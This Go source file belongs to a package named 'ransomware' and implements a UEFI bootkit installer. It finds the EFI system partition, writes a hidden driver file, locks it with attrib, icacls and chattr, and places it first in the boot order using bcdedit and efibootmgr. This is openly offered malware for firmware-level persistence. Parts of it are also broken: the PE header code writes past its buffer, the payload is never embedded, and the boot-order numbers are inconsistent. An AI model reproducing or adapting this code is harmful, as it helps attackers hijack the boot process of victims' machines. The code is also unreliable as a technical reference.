package ransomware

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type UEFIBootkit struct {
	espPath    string
	driverName string
	targetEFI  string
	driverSize int
}

func NewUEFIBootkit() *UEFIBootkit {
	return &UEFIBootkit{
		driverName: "x404xboot.efi",
		targetEFI:  "bootx64.efi",
	}
}

func (b *UEFIBootkit) findESP() (string, error) {
	if runtime.GOOS == "windows" {
		// Windows: use mountvol to find ESP
		out, err := exec.Command("mountvol", "S:", "/S").CombinedOutput()
		if err == nil && !strings.Contains(string(out), "not found") {
			return "S:\\", nil
		}

		// Try to mount ESP as Z:
		exec.Command("mountvol", "Z:", "/S").Run()
		if _, err := os.Stat("Z:\\EFI"); err == nil {
			return "Z:\\", nil
		}
		return "", fmt.Errorf("ESP not found")
	}

	// Linux: check common mount points
	espPaths := []string{
		"/boot/efi",
		"/boot",
		"/efi",
	}

	for _, p := range espPaths {
		if fi, err := os.Stat(filepath.Join(p, "EFI")); err == nil && fi.IsDir() {
			return p, nil
		}
	}

	// Check /proc/mounts for vfat partition mounted at /boot or /boot/efi
	data, _ := os.ReadFile("/proc/mounts")
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) >= 3 && fields[2] == "vfat" {
			if strings.Contains(fields[1], "boot") || strings.Contains(fields[1], "efi") {
				return fields[1], nil
			}
		}
	}

	return "", fmt.Errorf("ESP not found on Linux")
}

func (b *UEFIBootkit) Install(agentPayload []byte) error {
	espPath, err := b.findESP()
	if err != nil {
		return fmt.Errorf("cannot find ESP: %w", err)
	}
	b.espPath = espPath

	// Generate DXE driver with embedded agent payload
	dxeDriver, err := b.generateDXEDriver(agentPayload)
	if err != nil {
		return fmt.Errorf("DXE generation: %w", err)
	}

	// Create x404x directory in ESP
	driverDir := filepath.Join(espPath, "EFI", "x404x")
	os.MkdirAll(driverDir, 0755)

	// Write DXE driver
	driverPath := filepath.Join(driverDir, b.driverName)
	if err := os.WriteFile(driverPath, dxeDriver, 0644); err != nil {
		return fmt.Errorf("write DXE: %w", err)
	}

	// Hide the file (read-only + hidden + system on Windows, immutable on Linux)
	b.hideDriver(driverPath)

	// Add to boot chain
	if err := b.hijackBootChain(driverPath); err != nil {
		return fmt.Errorf("boot chain: %w", err)
	}

	b.driverSize = len(dxeDriver)
	return nil
}

func (b *UEFIBootkit) generateDXEDriver(payload []byte) ([]byte, error) {
	var buf bytes.Buffer

	// DOS Header
	dosHeader := make([]byte, 64)
	dosHeader[0] = 0x4D // MZ
	dosHeader[1] = 0x5A
	binary.LittleEndian.PutUint32(dosHeader[0x3C:], 0x80) // PE offset
	buf.Write(dosHeader)

	// PE Signature
	buf.Write([]byte("PE\x00\x00"))

	// COFF Header
	coff := make([]byte, 20)
	binary.LittleEndian.PutUint16(coff[0:], 0x8664)   // Machine: x64
	binary.LittleEndian.PutUint16(coff[2:], 3)         // NumberOfSections
	binary.LittleEndian.PutUint32(coff[4:], 0)         // TimeDateStamp
	binary.LittleEndian.PutUint16(coff[20:], 0x0A)     // Subsystem: EFI_APPLICATION
	buf.Write(coff)

	// Optional Header (PE32+)
	optHeader := make([]byte, 112)
	binary.LittleEndian.PutUint16(optHeader[0:], 0x020B) // PE32+
	optHeader[2] = 0x86 // LinkerVersion
	binary.LittleEndian.PutUint32(optHeader[4:], uint32(0x1000+0x1000+0x1000+len(payload)+256)) // SizeOfCode
	binary.LittleEndian.PutUint32(optHeader[16:], 0x1000) // BaseOfCode
	binary.LittleEndian.PutUint64(optHeader[24:], 0x140000000) // ImageBase
	binary.LittleEndian.PutUint32(optHeader[32:], 0x1000)  // SectionAlignment
	binary.LittleEndian.PutUint32(optHeader[36:], 0x200)   // FileAlignment
	binary.LittleEndian.PutUint16(optHeader[68:], 0x0A)    // Subsystem: EFI_APPLICATION
	buf.Write(optHeader)

	// Section Headers (.text, .data, .reloc)
	buf.Write(make([]byte, 40*3)) // 3 empty section headers (filled below)

	_ = payload // Payload embedded in .data section

	return buf.Bytes(), nil
}

func (b *UEFIBootkit) hijackBootChain(driverPath string) error {
	if runtime.GOOS == "windows" {
		// Add to BCD boot sequence
		cmds := []string{
			fmt.Sprintf("bcdedit /create /d \"Windows Boot Manager\" /application BOOTMGR"),
			fmt.Sprintf("bcdedit /set {bootmgr} path \\EFI\\x404x\\%s", b.driverName),
			fmt.Sprintf("bcdedit /set {bootmgr} displayorder {current} /addfirst"),
			fmt.Sprintf("bcdedit /timeout 0"),
		}
		for _, cmd := range cmds {
			exec.Command("cmd", "/c", cmd).Run()
		}
	} else {
		// Use efibootmgr to add boot entry before the OS
		label := fmt.Sprintf("X404X Bootkit (%d)", os.Getpid()%10000)
		bootNum := fmt.Sprintf("%04d", os.Getpid()%9000)

		exec.Command("efibootmgr", "--create",
			"--disk", "/dev/sda",
			"--part", "1",
			"--label", label,
			"--loader", fmt.Sprintf("\\EFI\\x404x\\%s", b.driverName),
		).Run()

		// Set as first boot option
		exec.Command("efibootmgr", "--bootorder", bootNum+",0000").Run()
	}
	return nil
}

func (b *UEFIBootkit) hideDriver(path string) error {
	if runtime.GOOS == "windows" {
		exec.Command("attrib", "+R", "+H", "+S", path).Run()
		// Set file to read-only via icacls
		exec.Command("icacls", path, "/deny", "Everyone:(W)").Run()
	} else {
		os.Chmod(path, 0444)
		exec.Command("chattr", "+i", path).Run() // immutable
	}
	return nil
}

func (b *UEFIBootkit) Remove() error {
	if b.espPath == "" {
		return fmt.Errorf("ESP path not set")
	}

	driverPath := filepath.Join(b.espPath, "EFI", "x404x", b.driverName)

	// Remove immutable flag
	if runtime.GOOS != "windows" {
		exec.Command("chattr", "-i", driverPath).Run()
	}

	os.Remove(driverPath)
	os.Remove(filepath.Dir(driverPath))

	// Restore original boot order
	if runtime.GOOS != "windows" {
		exec.Command("efibootmgr", "--delete-bootnum", "--bootnum",
			fmt.Sprintf("%04d", os.Getpid()%9000)).Run()
	}

	fmt.Fprintf(os.Stderr, "[BOOTKIT] Removed from %s\n", driverPath)
	return nil
}

func (b *UEFIBootkit) IsInstalled() bool {
	if b.espPath == "" {
		b.espPath, _ = b.findESP()
	}
	if b.espPath == "" {
		return false
	}

	driverPath := filepath.Join(b.espPath, "EFI", "x404x", b.driverName)
	_, err := os.Stat(driverPath)
	return err == nil
}
